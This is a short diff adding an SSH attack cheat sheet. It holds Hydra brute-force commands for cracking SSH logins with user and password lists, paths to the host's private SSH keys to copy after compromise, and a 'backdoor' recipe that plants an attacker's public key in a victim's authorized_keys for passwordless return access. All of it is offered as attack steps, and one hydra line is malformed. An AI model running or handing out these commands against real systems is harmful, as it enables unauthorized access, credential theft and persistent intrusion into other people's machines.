@@ -1,1 +1,35 @@
+Brute force
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
 
+Hydra SSH using list of users and passwords
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u > $ip ssh
+
+Copy ssh private kets: (Post Exploit)
+    $ /etc/ssh/ssh_host_dsa_key
+    $ /etc/ssh/ssh_host_key
+
+SSH backdoor - post exploitation
+# Attacker
+ssh-keygen -f <FILENAME>
+chmod 600 <FILENAME>
+cat <FILENAME>.pub -> copy
+
+# Victim
+echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+
+# Connect
+ssh -i <FILENAME> <USER>@<IP>
+
+
+
+
+# Generate ssh key pair
+ssh-keygen
+cp id_rsa.pub /tmp/authorized_keys
+
+# Transfer attacker public key to host
+put /tmp/authorized_keys
+exit
+
+# Login to SSH server with no password
+SSH_AUTH_SOCK=0 ssh user@192.168.0.20
